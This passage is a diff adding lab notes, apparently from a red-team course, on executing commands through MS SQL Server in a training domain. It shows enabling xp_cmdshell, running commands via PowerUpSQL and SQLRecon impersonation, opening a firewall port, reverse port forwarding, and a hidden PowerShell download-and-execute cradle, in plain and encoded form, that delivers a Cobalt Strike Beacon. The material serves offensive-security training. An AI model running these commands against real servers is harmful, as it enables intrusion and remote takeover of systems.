@@ -89,5 +89,65 @@ SQLRecon modules can also impersonate by prefixing the module name with an i and
 
       beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:iwhoami /i:DEV\mssql_svc
 
+## MS SQL Command Execution
 
+xp_cmdshell can be used to execute shell commands on the SQL server if user has sysadmin privileges. Invoke-SQLOSCmd from PowerUpSQL provides a simple means of using it:
+
+      beacon> powershell Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
+
+The same will fail if you try manually in Heidi or mssqlclient, because xp_cmdshell is disabled.
+
+      SQL> EXEC xp_cmdshell 'whoami';
+      [-] ERROR(SQL-2): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server.
+
+To show the state of xp_cmdshell (0 shows that xp_cmdshell is disabled):
+
+      SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
+
+To enable it:
+
+      sp_configure 'Show Advanced Options', 1; RECONFIGURE;
+      sp_configure 'xp_cmdshell', 1; RECONFIGURE;
       
+Invoke-SQLOSCmd works because it attempts to enable xp_cmdshell if it's not already, execute the given command, and then disable it again. This is a good example of why you should study your tools before you use them, so you know what is happening under the hood.
+
+Clean up when you're done; always return a configuration change on a target to its original value.
+
+SQLRecon has a module for changing the xp_cmdshell configuration, which can also be combined with the impersonation module:
+
+      beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc
+      beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig
+
+With command execution, we can try to execute a Beacon payload. As with other servers in the lab, the SQL servers cannot talk directly to the team server to download a payload. 
+
+1: Instead, setup a reverse port forward to tunnel that traffic through the C2 chain:
+
+      beacon> run hostname
+      beacon> getuid
+      beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
+      beacon> rportfwd 8080 127.0.0.1 80
+
+2: Host smb_x64.ps1 at /b on the team server.  We know SMB will work because we can validate that port 445 is open on the target SQL server.
+
+      beacon> portscan 10.10.122.25 445
+
+3: Download and execute the payload:
+
+      powershell -w hidden -c "iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')"
+
+or
+
+      powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBiACcAKQA=
+
+4: Keep an eye on the web log to see when the payload has been fetched:
+
+      01/05 15:09:07 visit (port 80) from: 127.0.0.1
+	      Request: GET /b
+	      page Serves /home/attacker/cobaltstrike/uploads/smb_x64.ps1
+	      null
+
+5: Link to the Beacon:
+
+      beacon> link sql-2.dev.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337
+
+What payload would you use if port 445 was closed?  Experiment with using the pivot listener here instead of SMB.
